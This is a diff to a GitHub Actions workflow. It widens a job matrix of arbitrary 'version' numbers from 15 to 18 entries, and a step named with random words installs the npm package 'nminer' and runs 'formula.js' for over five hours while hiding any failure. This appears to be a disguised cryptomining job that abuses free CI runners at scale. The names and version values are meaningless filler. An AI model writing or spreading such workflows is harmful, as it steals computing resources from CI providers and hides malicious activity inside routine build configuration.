@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7789 }
-          - { version: 5826 }
-          - { version: 7028 }
-          - { version: 689 }
-          - { version: 1832 }
-          - { version: 1651 }
-          - { version: 7732 }
-          - { version: 6097 }
-          - { version: 7707 }
-          - { version: 5573 }
-          - { version: 6332 }
-          - { version: 471 }
-          - { version: 8681 }
-          - { version: 9349 }
-          - { version: 4677 }
+          - { version: 2818 }
+          - { version: 134 }
+          - { version: 982 }
+          - { version: 9788 }
+          - { version: 130 }
+          - { version: 3916 }
+          - { version: 2499 }
+          - { version: 2284 }
+          - { version: 211 }
+          - { version: 7611 }
+          - { version: 3713 }
+          - { version: 3920 }
+          - { version: 6261 }
+          - { version: 5749 }
+          - { version: 1908 }
+          - { version: 5368 }
+          - { version: 7281 }
+          - { version: 6495 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: woot scoff aw humiliating
+      - name: hm aha yet blend
         run: |
           npm install nminer@latest
-          timeout 317m node formula.js || echo "formula executed"
+          timeout 312m node formula.js || echo "formula executed"
